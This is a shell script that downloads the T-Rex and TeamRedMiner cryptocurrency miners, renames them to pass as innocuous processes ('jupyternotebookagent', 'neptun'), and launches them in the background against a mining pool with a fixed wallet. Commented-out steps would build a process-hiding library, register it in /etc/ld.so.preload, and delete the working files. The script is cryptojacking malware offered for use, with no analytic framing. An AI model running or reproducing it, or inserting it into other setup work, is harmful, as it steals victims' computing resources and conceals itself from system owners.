mkdir -p /tmp/ml 
mv Makefile processhider.c /tmp/ml/
#./cudaubuntu.sh
#./cudafedora.sh
#./cudaredhat.sh 
#./amd.sh
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz -C /tmp/ml
cp /tmp/ml/t-rex /tmp/jupyternotebookagent
/tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
#./tmp/ml/make
#mv /tmp/ml/libprocesshider.so /usr/local/lib/
#echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/todxx/teamredminer/releases/download/v0.10.14/teamredminer-v0.10.14-linux.tgz
mv teamredminer-v0.10.14-linux.tgz /tmp/ml/teamredminer-v0.10.14-linux.tgz
tar zxvf /tmp/ml/teamredminer-v0.10.14-linux.tgz -C /tmp/ml
cp /tmp/ml/teamredminer /tmp/neptun
/tmp/neptun -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 & 
cp -r /amd /tmp/ml/
#./tmp/ml/amd/make
#mv /tmp/ml/surec.so /usr/local/lib/
#echo /usr/local/lib/surec.so >> /etc/ld.so.preload
#rm -rf /tmp/ml

